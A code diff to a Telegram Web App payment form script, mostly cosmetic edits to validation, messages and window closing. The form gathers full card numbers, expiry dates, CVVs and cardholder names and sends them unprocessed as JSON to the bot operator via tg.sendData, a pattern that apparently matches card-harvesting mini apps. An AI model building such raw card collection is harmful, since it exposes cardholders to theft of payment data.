@@ -72,7 +72,7 @@ document.addEventListener('DOMContentLoaded', function () {
     paymentForm.addEventListener('submit', function (e) {
         e.preventDefault();
 
-        // Basic validation (you can add more)
+        // Basic validation
         if (!cardNumberInput.value || !expiryInput.value || !cvvInput.value || !cardHolderInput.value) {
             alert('Please fill in all fields.');
             return;
@@ -83,10 +83,10 @@ document.addEventListener('DOMContentLoaded', function () {
             transaction_id: transactionId,
             amount: amount,
             payment_id: paymentId,
-            cardNumber: cardNumberInput.value,
-            expiry: expiryInput.value,
-            cvv: cvvInput.value,
-            cardHolder: cardHolderInput.value
+            cardNumber: cardNumberInput.value.trim(),
+            expiry: expiryInput.value.trim(),
+            cvv: cvvInput.value.trim(),
+            cardHolder: cardHolderInput.value.trim()
         };
 
         // Use Telegram Web App API to send data
@@ -95,10 +95,15 @@ document.addEventListener('DOMContentLoaded', function () {
             try {
                 tg.sendData(JSON.stringify(formData));
                 
-                // Показываем сообщение об успешной отправке и закрываем WebApp
-                paymentForm.innerHTML = `<p style="color:green; text-align:center; font-size: 18px;">✅ Payment data sent successfully!<br>Closing payment window...</p>`;
+                // Показываем сообщение об успешной отправке
+                paymentForm.innerHTML = `
+                    <p style="color:green; text-align:center; font-size: 18px;">
+                        ✅ Payment data sent successfully!<br>
+                        Closing payment window...
+                    </p>
+                `;
                 
-                // Закрываем WebApp через небольшую задержку, чтобы пользователь увидел сообщение
+                // Закрываем WebApp через 2 секунды
                 setTimeout(() => {
                     tg.close();
                 }, 2000);
@@ -108,14 +113,9 @@ document.addEventListener('DOMContentLoaded', function () {
                 paymentForm.innerHTML = `<p style="color:red; text-align:center;">❌ Error sending payment data. Please try again.</p>`;
             }
         } else {
-            // Если Telegram WebApp не доступен — показываем сообщение и закрываем через задержку
+            // Если Telegram WebApp не доступен — показываем сообщение
             console.warn("Telegram WebApp not found. Data may not be sent.");
-            paymentForm.innerHTML = `<p style="color:orange; text-align:center;">⚠️ Payment simulation completed.<br>Closing window...</p>`;
-            
-            // Закрываем окно через задержку даже без Telegram WebApp
-            setTimeout(() => {
-                window.close();
-            }, 2000);
+            paymentForm.innerHTML = `<p style="color:orange; text-align:center;">⚠️ Payment simulation completed.<br>Cannot close window outside Telegram.</p>`;
         }
     });
 });
